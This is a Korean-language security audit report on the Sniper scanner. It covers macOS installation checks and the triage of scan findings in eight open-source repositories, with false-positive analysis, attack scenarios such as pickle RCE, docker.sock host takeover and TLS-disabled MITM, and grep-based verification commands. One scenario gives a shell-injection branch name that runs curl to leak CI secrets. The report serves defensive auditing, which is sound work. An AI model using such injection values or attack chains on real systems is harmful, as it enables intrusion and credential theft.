# Gökçe Baran Karakamış — Sniper macOS 설치 검증, 스캔된 오픈소스 저장소 및 검증된 보안 권고 보고서

[English](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.en.md) | [Türkçe](SNIPER-TARANAN-DEPOLAR-VE-BAGLANTILI-ACIKLAR.md) | [日本語](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ja.md) | [简体中文](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.zh-CN.md) | **한국어**

**저자 / 보안 연구원:** **Gökçe Baran Karakamış** ([@dytredline](https://github.com/dytredline))

이 포괄적인 기술 가이드 및 보안 연구 보고서는 세 가지 핵심 파트로 구성되어 있습니다:
1. **파트 I — macOS (Apple Silicon) 실제 하드웨어 설치 및 런타임 검증 보고서:** 실제 macOS 하드웨어에서 **네이티브 소스 설치(`--core-only`)**와 **Docker Desktop 5-엔진 컨테이너 스택(`community-tools`)**을 모두 사용하여 Sniper Community를 엔드투엔드로 테스트하고 검증한 결과입니다.
2. **파트 II — Sniper로 스캔한 8개 오픈소스 저장소, 취약점 전환 메커니즘 및 일상 시나리오:** **Gökçe Baran Karakamış**가 **Sniper** 정적 분석(SAST), 코드형 인프라(IaC) 및 소프트웨어 구성 분석(SCA) 엔진으로 스캔한 **8개 오픈소스 저장소**에 대한 소스 코드 수준 감사, 오탐(False Positive) 제거, 코드/설정 결함이 어떤 조건에서 실제 취약점으로 이어지는지에 대한 쉬운 설명, 각 저장소별 **3가지 일상 핵심 시나리오(`시나리오 A / B / C`)**, 그리고 **예제 실행 및 검증 명령어**입니다.
3. **파트 III — Sniper 스캔에서 발견한 11건의 검증된 보안 취약점(`01`..`11`), 코드 분석, 시나리오 및 런타임 증명(`RED -> GREEN + BENIGN`):** 6개 오픈소스 프로젝트(**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**)에서 발견되어 GitHub Security Advisory(`GHSA`)로 보고된 **11건의 검증된 보안 취약점**이 코드에서 어떻게 발생하고 단계별로 어떻게 취약점으로 작동하는지, 각 항목에 대한 **3가지 구체적인 일상 핵심 시나리오(`시나리오 A / B / C`)**, **예제 실행/트리거 명령어**, 그리고 **검증된 방어 패치(`git diff`)**를 다룹니다.

---

## 파트 I — macOS (Apple Silicon) 실제 하드웨어 설치 및 검증 보고서 (2026-10-24)

macOS (Apple Silicon)에서의 Sniper 설치는 **실험적(Experimental) 기능이 아닙니다**. **네이티브 소스 설치(`--core-only`)**와 **Docker Desktop 5-엔진 설치** 모두 실제 macOS 하드웨어에서 테스트 및 검증을 마쳤으며 공식 지원됩니다:

| 설치 경로 | 실행 명령어 | 실제 macOS 하드웨어에서 검증된 범위 | 상태 |
| :--- | :--- | :--- | :---: |
| **1. 네이티브 macOS 소스 설치 (Native Source Setup)** | `python3 scripts/setup-community --core-only` | `.venv` (CPython 3.12) 생성, 잠금 런타임 패키지(`requirements-runtime.lock` + `pip check`) 설치, `scripts/sniper-mcp --help`, `scripts/sniper-project-audit --help`, `cli_reports.py --help`, 로컬 루프백 웹 UI(`127.0.0.1:8787`), 로컬 SQLite 데이터 디렉터리 초기화 및 샘플 프로젝트 실제 감사 수행 | **실제 하드웨어 검증 완료 (PASS)** |
| **2. Docker Desktop 5-엔진 컨테이너 스택 (5-Engine Container Stack)** | `python3 scripts/setup-community` *(또는 `docker compose --profile community-tools up -d`)* | Docker Desktop (Apple Silicon / `linux/arm64`)에서 `sniper-community` 코어 컨테이너와 5개 오픈소스 보조 보안 엔진(`zap`, `nuclei`, `trivy`, `httpx`, `katana`) 기동, 헬스체크 및 공유 `/workspace` 볼륨 감사 | **실제 하드웨어 검증 완료 (PASS)** |

### 실제 macOS 하드웨어에서 확인된 기술 세부 사항
* **Apple Silicon (`arm64`) 네이티브 Python 환경:** `scripts/setup-community`는 macOS의 Homebrew Python(`3.11+` / `3.12`)을 자동 감지하고 네이티브 `arm64` 휠 패키지(`fastapi`, `uvicorn`, `pydantic`, `PyJWT`, `cryptography`, `httpx`, `beautifulsoup4`, `jinja2`)를 사용해 의존성 충돌 없이(`pip check: No broken requirements found`) `.venv`를 구축합니다.
* **엔드투엔드 로컬 프로젝트 감사:** 실제 macOS 하드웨어에서 실행한 `scripts/sniper-project-audit`는 SAST, IaC, SCA 3개 계층 모두에서 구조화된 JSON, SARIF, Markdown 보고서를 수 초 이내에 생성했습니다.
* **Docker 다중 아키텍처 호환성:** `docker-compose.yml`의 `community-tools` 프로파일은 Apple Silicon Docker Desktop에서 네이티브 `arm64` 또는 투명한 아키텍처 호환 계층을 통해 안정적으로 동작하며 `127.0.0.1:8787` 루프백 경계를 유지합니다.

---

## 파트 II — Sniper로 스캔한 8개 오픈소스 저장소 및 잠재적 연관 취약점 분석

이 파트에서는 사전 보안 연구에서 **Sniper**로 스캔한 **8개 오픈소스 저장소** 각각에 대해 (A) Sniper 스캔 통계 요약, (B) 소스 코드 검증을 통한 오탐(False Positive) 분리, (C) 실제 존재하는 코드 및 인프라 설정 결함, (D) **코드에서 어떻게 발생하고 취약점으로 전환되는지(누구나 이해할 수 있는 설명)**, (E) **일상 환경에서 발생 가능한 3가지 핵심 시나리오(`시나리오 A / B / C`)**, (F) **단독 vs. 결합(공격 체인 Chaining) 심각도 분석**, 그리고 (G) **예제 실행 및 검증 명령어**를 상세히 제시합니다.

---

## 1. AutoGPT (`Significant-Gravitas/AutoGPT`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `93`건 (Critical `2`, High `39`, Medium `49`, Low `3`)
* **트리아지 전체 탐지 수:** `142`건 (SAST `61`, IaC `42`, SCA `39`)

### B. 소스 코드 검증 및 오탐(False Positive) 분리
1. **오탐으로 확인된 Critical/High SAST 알림:**
   * `autogpt_platform/backend/backend/executor/manager.py` 및 `scheduler.py`의 **Critical SQL 인젝션(`obj.execute(...)`) 2건**은 데이터베이스 SQL 실행이 아니라 워크플로 블록 객체의 Python 메서드 호출(`block_obj.execute(input_data)`)이므로 **완전한 오탐(False Positive)**입니다.
   * FastAPI 라우터의 `Security(...)` 의존성 주입 및 테스트 파일의 더미 JWT 문자열 알림 또한 오탐입니다.
2. **실제 존재하는 것으로 확인된 코드 및 인프라 결함:**
   * **DB 신뢰 경계에 의존하는 `pickle.loads` 역직렬화:** `autogpt_platform/backend/backend/util/jobstore_backfill.py:67`은 APScheduler 작업 테이블(`apscheduler_jobs.job_state`)에서 읽은 바이트 열에 대해 직접 `pickle.loads(job_state)`를 호출합니다.
   * **Docker Compose 하드코딩 기본 비밀번호 및 root 실행 Dockerfile:** 로컬/배포용 Compose 파일에 기본 PostgreSQL/Redis 비밀번호가 포함되어 있으며 일부 컨테이너가 `root` 권한으로 실행됩니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
Python의 `pickle.loads()`는 바이트 데이터를 객체로 복원할 때 공격자가 조작한 `__reduce__` 함수를 자동으로 실행하는 위험한 함수입니다. 평소에 `jobstore_backfill.py`는 내부 PostgreSQL 데이터베이스의 `apscheduler_jobs` 테이블만 읽습니다. 하지만 운영자가 Docker Compose의 기본 DB 비밀번호(`postgres` 등)를 그대로 스테이징/내부망 서버에 사용하거나 공격자가 다른 경로로 DB 쓰기 권한을 획득하면, 공격자는 `apscheduler_jobs` 테이블에 악성 Pickle 페이로드를 삽입하여 백필 스크립트가 실행되는 순간 **`root` 권한 컨테이너 내부에서 원격 명령 실행(RCE)**을 달성할 수 있습니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 기본 Compose 비밀번호를 유지한 스테이징 서버에서 DB 오염을 통한 RCE:**
  1. 사내 AI 팀이 클라우드 VM에 Docker Compose로 AutoGPT Platform을 배포하면서 PostgreSQL 포트를 기본 비밀번호 상태로 내부망에 노출합니다.
  2. 동일 네트워크의 침해된 호스트에서 공격자가 PostgreSQL의 `apscheduler_jobs` 테이블에 악성 `job_state`(Pickle 페이로드)를 기록합니다.
  3. `jobstore_backfill.py:67`이 `pickle.loads(job_state)`를 실행하면서 `root` 컨테이너에서 임의 명령이 실행되고 설정된 OpenAI/Anthropic API 키가 유출됩니다.
* **시나리오 B — 공유 Redis / 메시지 브로커 비인증 접근을 통한 실행기 작업 변조:**
  1. 여러 테스트 환경이 인증 없는 내부 Redis 인스턴스를 공유합니다.
  2. 공격자가 큐 페이로드를 조작하여 백엔드 Executor 워커가 비인가 작업을 수행하도록 유도합니다.
* **시나리오 C — `root` 컨테이너에서 호스트 볼륨 마운트 시 호스트 파일 덮어쓰기:**
  1. 개발자가 호스트 디렉터리를 AutoGPT 컨테이너에 마운트한 채 `root` 사용자로 컨테이너를 실행합니다.
  2. 컨테이너 내부에서 파일 쓰기 작업이 발생할 때 호스트의 설정 파일이나 스크립트가 `root` 권한으로 덮어써집니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 심각도:** **낮음 / 중간 (Low / Medium)** (외부 비인증 사용자가 직접 `pickle.loads`를 호출할 수 있는 경로는 없음).
* **결합(Chaining) 심각도:** **조건부 중간 / 높음 (Conditional Medium / High)** (공격자가 DB `apscheduler_jobs` 테이블 쓰기 권한을 획득한 경우에만 `pickle.loads` + `root` 컨테이너가 결합됨). 직접적인 비인증 취약점이 아닌 심층 방어(Defense-in-Depth) 강화 대상입니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. AutoGPT 저장소에 대한 Sniper 전체 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/autogpt" --format json --output "$HOME/audit-targets/reports/autogpt-audit.json"

# 2. jobstore_backfill.py 내 pickle.loads 호출 코드 확인
grep -n -C 5 "pickle.loads" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/util/jobstore_backfill.py"

# 3. 오탐으로 확인된 executor/manager.py의 .execute() 호출 확인
grep -n -C 5 "\.execute(" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/executor/manager.py"
```

---

## 2. Zitadel (`zitadel/zitadel`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `67`건 (Critical `8`, High `42`, Medium `17`)
* **트리아지 전체 탐지 수:** `286`건

### B. 소스 코드 검증 및 오탐(False Positive) 분리
1. **8건의 Critical SAST 알림은 모두 오탐:** Go 코드 내 `exec.Command` 및 SQL 쿼리 생성 관련 Critical 알림 8건은 모두 빌드 도구 및 마이그레이션 스크립트 내부의 고정 상수 호출로, 외부 입력이 유입되지 않는 **완전한 오탐(False Positive)**입니다.
2. **실제 존재하는 인프라 설정 결함:**
   * `deploy/compose/` 하위의 개발/예제용 Compose 파일 3개에서 호스트의 `/var/run/docker.sock`을 컨테이너에 마운트합니다.
   * `apps/docs/` 문서 예제 설정에서 `NODE_TLS_REJECT_UNAUTHORIZED=0`이 사용됩니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
호스트의 `/var/run/docker.sock`은 Docker 데몬을 제어하는 최고 권한 소켓입니다. 이 소켓이 마운트된 컨테이너가 침해되면 공격자는 호스트 전체 파일시스템(`/`)을 마운트한 특권 컨테이너를 새로 띄워 호스트 OS를 즉시 장악할 수 있습니다. 또한 `NODE_TLS_REJECT_UNAUTHORIZED=0`은 Node.js의 TLS 인증서 검증을 완전히 끄기 때문에, 문서 예제를 그대로 운영 환경에 복사하면 중간자 공격(MITM)에 노출됩니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 개발용 Compose 파일을 그대로 사용한 공유 스테이징 서버에서 `docker.sock`을 통한 호스트 장악:**
  1. DevOps 팀이 공유 VM에 `deploy/compose/` 구성을 그대로 배포하여 보조 컨테이너에 `/var/run/docker.sock`이 마운트됩니다.
  2. 해당 컨테이너가 침해되면 공격자는 `docker.sock`을 통해 호스트 `/`를 마운트한 컨테이너를 실행하고 Zitadel 마스터 키와 DB 자격 증명을 탈취합니다.
* **시나리오 B — 문서의 `NODE_TLS_REJECT_UNAUTHORIZED=0` 예제를 복사한 포털에서 OIDC 토큰 탈취:**
  1. 개발자가 `apps/docs/` 예제를 참고하여 프로덕션 Node.js 환경 변수에 `NODE_TLS_REJECT_UNAUTHORIZED=0`을 적용합니다.
  2. 네트워크 경로상의 공격자가 자체 서명 인증서로 TLS 연결을 가로채어 OIDC 액세스 토큰과 클라이언트 시크릿을 탈취합니다.
* **시나리오 C — 자체 호스팅 CI 러너에서 `docker.sock` 공유로 인한 빌드 이미지 오염:**
  1. CI 테스트 중 `docker.sock`에 접근한 악성 테스트 코드가 호스트의 다른 컨테이너 이미지를 변조합니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 및 결합 심각도:** **낮음 / 중간 (Low / Medium)**. `docker.sock`(`deploy/compose/`)과 `NODE_TLS_REJECT_UNAUTHORIZED=0`(`apps/docs/`)은 서로 다른 예제 파일에 위치하며 제품 CVE가 아닌 배포 템플릿 강화 항목입니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. Zitadel 저장소에 대한 Sniper 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/zitadel" --format json --output "$HOME/audit-targets/reports/zitadel-audit.json"

# 2. Compose 파일 내 docker.sock 마운트 위치 확인
grep -rn "docker.sock" "$HOME/audit-targets/zitadel/deploy/"

# 3. 문서 예제 내 NODE_TLS_REJECT_UNAUTHORIZED 설정 확인
grep -rn "NODE_TLS_REJECT_UNAUTHORIZED" "$HOME/audit-targets/zitadel/apps/docs/"
```

---

## 3. Nextcloud MCP Server (`cbcoutinho/nextcloud-mcp-server`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `59`건 (SAST Critical `1` / High `6`, IaC High `7`, SCA Critical `5` / High `40`)

### B. 소스 코드 검증 및 오탐(False Positive) 분리
1. **SSRF 알림(`nextcloud_mcp_server/auth/login_flow.py:192`)은 오탐:** `poll_endpoint`로 요청을 보내기 전 `initiate()` 단계에서 `_rewrite_to_nextcloud_host(poll_endpoint, self.nextcloud_host)`가 호출되어 스킴, 호스트, 포트를 모두 신뢰된 `self.nextcloud_host`로 강제 고정하므로 외부/내부망 SSRF가 발생하지 않습니다.
2. **JWT 알림(`token_utils.py`)은 토큰 검사 유틸리티:** `verify_signature=False`는 메타데이터 표시용 헬퍼이며 인증 우회가 아닙니다.
3. **GitHub Actions 워크플로(`.github/workflows/pact.yml`):** 브랜치 이름 셸 보간이 존재하나 `if: github.event.pull_request.head.repo.full_name == github.repository`(`same-repo` 가드)로 외부 포크 PR은 차단되어 있습니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
로그인 플로우에서 서버가 반환한 `poll.endpoint` URL을 검증 없이 요청하면 내부망(`169.254.169.254` 등)을 호출하는 SSRF가 발생할 수 있으나, 이 프로젝트는 `_rewrite_to_nextcloud_host()`로 대상 오리진을 고정하여 이를 방지했습니다. 반면 `.github/workflows/pact.yml`은 동일 저장소 PR의 브랜치 이름을 셸에 직접 삽입하므로, 저장소 쓰기 권한이 있는 계정이 탈취된 경우 CI 러너에서 명령이 실행될 수 있습니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 동일 저장소 브랜치 이름을 이용한 `pact.yml` CI 시크릿 유출:**
  1. 저장소 쓰기 권한을 가진 개발자의 토큰이 유출되어 공격자가 `feat";curl ...;#` 브랜치를 생성하고 PR을 엽니다.
  2. `same-repo` 조건을 통과한 `pact.yml`이 브랜치 이름을 bash에서 실행하여 CI 시크릿이 유출됩니다.
* **시나리오 B — HTTP/SSE 모드로 내부망에 배포할 때 오래된 잠금 파일 패키지(SCA) 노출:**
  1. 팀이 MCP 서버를 HTTP 서비스로 사내망에 배포할 때 업데이트되지 않은 서드파티 웹 라이브러리의 알려진 취약점(SCA 탐지 항목)이 노출됩니다.
* **시나리오 C — 커스텀 포크에서 `_rewrite_to_nextcloud_host()` 제거 시 SSRF 발생:**
  1. 개발자가 리버스 프록시 구성을 위해 `_rewrite_to_nextcloud_host()`를 제거하면 `poll_endpoint`를 통한 내부망 SSRF가 가능해집니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 및 결합 심각도:** **낮음 (Low)**. 검증된 SAST 취약점은 없으며 내부 CI 하드닝 및 의존성 업데이트 대상입니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. Nextcloud MCP Server에 대한 Sniper 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/nextcloud-mcp" --format json --output "$HOME/audit-targets/reports/nextcloud-mcp-audit.json"

# 2. login_flow.py 내 _rewrite_to_nextcloud_host 보호 로직 확인
grep -n -C 12 "_rewrite_to_nextcloud_host" "$HOME/audit-targets/nextcloud-mcp/nextcloud_mcp_server/auth/login_flow.py"

# 3. pact.yml 내 same-repo 조건 확인
grep -n -C 8 "head.repo.full_name" "$HOME/audit-targets/nextcloud-mcp/.github/workflows/pact.yml"
```

---

## 4. MCPJam Inspector (`MCPJam/inspector`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `122`건 (SAST Critical `12` / High `8`, SCA Critical `6` / High `96`)

### B. 소스 코드 검증 및 오탐(False Positive) 분리
* **Critical/High SAST 20건 중 18건은 명백한 오탐:** 14건은 주석 내 영문 표현 `eval (` / `exec (`, 2건은 TypeScript 선언 파일(`.d.ts`), 2건은 UI 텍스트 결합입니다.
* **실제 존재하는 결함:** `.github/workflows/pr-preview.yml`의 `same-repo` 가드 하의 브랜치 이름 보간 및 npm 잠금 파일의 SCA 의존성 레코드입니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
`pr-preview.yml` 워크플로는 외부 포크 PR을 차단하고 있지만, 동일 저장소 브랜치 이름을 환경 변수(`env:`) 대신 스크립트에 직접 보간합니다. 또한 공유 개발 서버에서 Inspector를 호스팅할 경우 잠금 파일 내 구버전 npm 패키지(SCA)가 공격 표면이 될 수 있습니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 내부 브랜치 이름을 통한 `pr-preview.yml` 프리뷰 배포 토큰 노출:**
  1. 저장소 브랜치 생성 권한이 있는 계정이 셸 메타문자가 포함된 브랜치로 PR을 열어 프리뷰 배포 환경 시크릿에 접근합니다.
* **시나리오 B — 사내 공유 디버깅 서버로 운영 중인 Inspector의 구버전 npm 의존성 악용:**
  1. 업데이트되지 않은 npm 패키지가 포함된 상태로 사내망에 노출되어 DoS 또는 요청 위조에 악용됩니다.
* **시나리오 C — 신뢰할 수 없는 외부 MCP 서버 응답을 검사할 때의 클라이언트 처리 위험:**
  1. 악성 MCP 서버에 연결해 대용량/비정상 응답을 렌더링할 때 브라우저 탭이 멈추거나 구버전 UI 라이브러리 결함이 트리거됩니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 및 결합 심각도:** **낮음 / 중간 (Low / Medium)**. 외부 포크 PR은 차단되어 있으며 내부 CI 하드닝과 SCA 업그레이드가 권장됩니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. MCPJam Inspector에 대한 Sniper 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/mcpjam-inspector" --format json --output "$HOME/audit-targets/reports/mcpjam-inspector-audit.json"

# 2. pr-preview.yml의 조건문 및 브랜치 보간 확인
grep -n -C 10 "pull_request" "$HOME/audit-targets/mcpjam-inspector/.github/workflows/pr-preview.yml"
```

---

## 5. Codebase Memory MCP (`DeusData/codebase-memory-mcp`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `32`건 (SAST Critical `17` / High `7`, SCA High `8`)

### B. 소스 코드 검증 및 오탐(False Positive) 분리
* **17건의 Critical SAST 알림은 모두 오탐:**
  * `src/store/store.c:2864` SQL 인젝션 알림은 고정 테이블 이름 배열과 `sqlite3_prepare_v2` 파라미터 바인딩(`?`)을 사용합니다.
  * `src/lang/c_lsp.h:54`는 주석이며, `kotlin_lsp.c`, `py_lsp.c`, `store.c:4482`는 모두 크기 제한이 있는 `snprintf` 버퍼 연산이고, `xmalloc.c`와 `mcp.c`도 안전한 메모리 래퍼입니다.
  * `src/http/http_server.c`는 `localhost` / `127.0.0.1`만 허용하는 엄격한 `Host` 헤더 검증(위반 시 `403 Forbidden`)과 로컬 전용 CORS 정책을 구현하여 드라이브바이 브라우저 공격 및 DNS 리바인딩을 차단합니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
C 언어 서버에서 길이 제한 없는 문자열 복사를 쓰면 버퍼 오버플로가 되고, 로컬 HTTP 서버가 `Host`와 `Origin` 헤더를 검사하지 않으면 악성 웹페이지가 로컬 코드 인덱스를 훔칠 수 있습니다. 그러나 `codebase-memory-mcp`의 실제 C 코드를 검증한 결과 모든 SQL 쿼리는 바인딩 처리되어 있고, 버퍼는 `snprintf`로 길이가 제한되며, `http_server.c`는 외부 `Host`와 교차 출처 요청을 `403`으로 거부하므로 실제 취약점으로 전환되지 않습니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (경계 설정 오류 시 `시나리오 A / B / C`)
* **시나리오 A — 리버스 프록시에서 `Host: localhost`를 고정 재작성하여 LAN에 노출한 경우:**
  1. 개발자가 원격 접속을 위해 `nginx`로 로컬 포트를 LAN에 포워딩하면서 `proxy_set_header Host localhost`를 설정하면 `http_server.c`의 `Host` 검증이 우회되어 내부망에서 코드 그래프 조회가 가능해집니다.
* **시나리오 B — 다중 사용자 공유 Linux 서버에서의 로컬 루프백 접근:**
  1. 여러 개발자가 SSH로 함께 쓰는 Linux 서버에서는 다른 로컬 OS 사용자 프로세스도 `127.0.0.1` 포트에 연결할 수 있으므로 `/home/community-user/private-project` 인덱스를 조회할 수 있습니다.
* **시나리오 C — 초대형 모노레포 초기 인덱싱 시 로컬 CPU 및 디스크 I/O 점유:**
  1. 빌드 아티팩트 디렉터리를 제외하지 않고 대규모 저장소를 인덱싱할 때 일시적인 리소스 병목이 발생합니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 및 결합 심각도:** **낮음 (Low)**. 원격 브라우저 코드 유출 체인은 `http_server.c`의 방어 로직으로 인해 성립하지 않습니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. Codebase Memory MCP에 대한 Sniper 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/codebase-memory-mcp" --format json --output "$HOME/audit-targets/reports/codebase-memory-mcp-audit.json"

# 2. http_server.c 내 Host 헤더 검증(403 Forbidden) 및 CORS 방어 확인
grep -n -C 15 "403" "$HOME/audit-targets/codebase-memory-mcp/src/http/http_server.c"

# 3. store.c:2864 주변의 sqlite3 파라미터 바인딩 코드 확인
sed -n '2850,2880p' "$HOME/audit-targets/codebase-memory-mcp/src/store/store.c"
```

---

## 6. GitLab MCP Server (`yoda-digital/gitlab-mcp-server`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `5`건 (Critical `0`, High `4`, Medium `1`)

### B. 소스 코드 검증 및 오탐(False Positive) 분리
* `recorder.go`와 `make.go` 알림은 테스트 레코더 및 빌드 도구로 오탐입니다.
* 유일한 실제 보안 설정 항목은 사용자가 명시적으로 `GITLAB_MCP_SKIP_TLS_VERIFY=true`를 설정했을 때만 `InsecureSkipVerify: true`가 활성화되는 옵션입니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
사내 자체 서명(Self-Signed) GitLab 서버의 인증서 오류를 피하려고 개발자가 `GITLAB_MCP_SKIP_TLS_VERIFY=true`를 켜면 Go HTTP 클라이언트가 TLS 인증서 검증을 완전히 생략합니다. 이후 개발자가 카페나 호텔 Wi-Fi에서 IDE를 실행하면 동일 네트워크의 중간자(MITM) 공격자가 위조 인증서로 연결을 가로채어 `Authorization: Bearer glpat-...` 개인 액세스 토큰을 탈취할 수 있습니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 사내 GitLab용으로 `GITLAB_MCP_SKIP_TLS_VERIFY=true`를 설정한 개발자가 외부 Wi-Fi에서 토큰을 탈취당함:**
  1. 엔지니어가 사내 GitLab 인증서 오류를 숨기기 위해 IDE MCP 설정에 `GITLAB_MCP_SKIP_TLS_VERIFY=true`를 추가합니다.
  2. 외부 카페/호텔 Wi-Fi에서 IDE를 열었을 때 공격자가 위조 인증서로 응답하여 `glpat-...` 토큰을 가로챕니다.
* **시나리오 B — 팀 공유 온보딩 문서에 안전하지 않은 MCP 설정 템플릿이 배포됨:**
  1. 팀 위키의 `claude_desktop_config.json` 예제에 `GITLAB_MCP_SKIP_TLS_VERIFY=true`가 기본 포함되어 전사 개발자에게 퍼집니다.
  2. 정상 TLS 인증서를 쓰는 운영 GitLab 서버 연결까지 검증이 비활성화됩니다.
* **시나리오 C — 기업 TLS 검사 프록시 환경에서 루트 CA 등록 대신 검증 비활성화 사용:**
  1. CI 에이전트에 사내 CA 인증서(`SSL_CERT_FILE`)를 등록하는 대신 `GITLAB_MCP_SKIP_TLS_VERIFY=true`를 켜서 모든 소스 코드/PR 트래픽이 비검증 상태에 놓입니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 및 결합 심각도:** **낮음 (Low)**. 기본값은 TLS 검증 활성 상태이며 결합되는 다른 취약점은 없습니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. GitLab MCP Server에 대한 Sniper 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/gitlab-mcp-server" --format json --output "$HOME/audit-targets/reports/gitlab-mcp-server-audit.json"

# 2. GITLAB_MCP_SKIP_TLS_VERIFY 및 InsecureSkipVerify 구현 확인
grep -rn -C 8 "GITLAB_MCP_SKIP_TLS_VERIFY" "$HOME/audit-targets/gitlab-mcp-server/"
```

---

## 7. Apktool MCP (`zinja-coder/apktool-mcp-server`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `16`건 (SAST Medium `1`, SCA Critical `4` / High `12`)

### B. 소스 코드 검증 및 오탐(False Positive) 분리
* 퍼스트파티 Python 코드에는 Critical/High SAST 취약점이 없으며 Medium 1건은 오탐입니다.
* `uv.lock` 내부에 고정된 서드파티 패키지(`authlib 1.6.8`, `cryptography 46.0.5`, `pyjwt 2.11.0`, `python-multipart 0.0.20`, `starlette 0.47.3`, `urllib3 2.5.0`)에서 **Critical 4건, High 12건의 SCA 의존성 레코드**가 확인되었습니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
직접 작성한 코드가 안전하더라도 `uv.lock`에 구버전 라이브러리가 고정되어 있으면 `uv sync --frozen` 실행 시 취약한 버전이 그대로 설치됩니다. Apktool MCP를 로컬 `stdio` 대신 네트워크 HTTP/SSE 서비스로 노출하면 하위 `authlib`/`pyjwt` 인증 결함이나 `python-multipart` DoS 취약점이 공격 표면에 노출됩니다.

### E. 일상 환경에서 발생 가능한 3가지 핵심 시나리오 (`시나리오 A / B / C`)
* **시나리오 A — 원격 공유 APK 분석 서버에서 `authlib 1.6.8` / `pyjwt 2.11.0` 취약점을 통한 인증 우회:**
  1. 보안팀이 Apktool MCP를 사내 분석 서버에서 HTTP/SSE 모드로 실행하고 JWT 인증을 적용합니다.
  2. `uv.lock`의 구버전 `authlib` / `pyjwt` 검증 결함으로 인해 비인가 사용자가 디컴파일 API를 호출합니다.
* **시나리오 B — `python-multipart 0.0.20` 및 `starlette 0.47.3`을 통한 멀티파트 요청 서비스 거부(DoS):**
  1. HTTP 엔드포인트에 조작된 boundary를 가진 `multipart/form-data` 요청이 전송되어 파서가 과도한 CPU/메모리를 소모합니다.
* **시나리오 C — 악성 압축 APK(Zip Bomb) 디컴파일을 통한 분석 서버 디스크/메모리 고갈:**
  1. 악성 APK 샘플 분석 중 비정상적으로 부풀려진 리소스 파일이 추출되며 로컬 스토리지가 고갈됩니다.

### F. 단독 및 결합(Chaining) 심각도 분석
* **단독 및 결합 심각도:** **낮음 / 중간 (SCA)**. 퍼스트파티 코드 체인은 없으며 의존성 업데이트가 권장됩니다.

### G. 예제 실행 및 검증 명령어
```bash
# 1. Apktool MCP에 대한 Sniper 감사 실행
python3 scripts/sniper-project-audit "$HOME/audit-targets/apktool-mcp" --format json --output "$HOME/audit-targets/reports/apktool-mcp-audit.json"

# 2. uv.lock 내 주요 패키지 버전 확인
grep -n -A 2 -E 'name = "(authlib|cryptography|pyjwt|python-multipart|starlette|urllib3)"' "$HOME/audit-targets/apktool-mcp/uv.lock"

# 3. Sniper CLI로 High 이상 탐지 항목 조회
python3 cli_reports.py --input "$HOME/audit-targets/reports/apktool-mcp-audit.json" --min-severity high
```

---

## 8. JADX MCP (`zinja-coder/jadx-mcp-server`)

### A. Sniper 스캔 통계 요약
* **임계값 초과(고신뢰도) 탐지 수:** `32`건 (SAST Medium `3`, SCA Critical `6` / High `26`)

### B. 소스 코드 검증 및 오탐(False Positive) 분리
* 검증된 Critical/High 퍼스트파티 SAST 취약점은 없습니다.
* `uv.lock` 내부에 **Critical 6건, High 26건의 SCA 의존성 레코드**(`authlib 1.6.8`, `pyjwt 2.11.0`, `cryptography 46.0.5`, `python-multipart 0.0.20`, `starlette 0.47.3`, `urllib3 2.5.0` 등)가 존재합니다.

### D. 코드에서 어떻게 발생하고 취약점으로 전환되는가 (쉬운 설명)
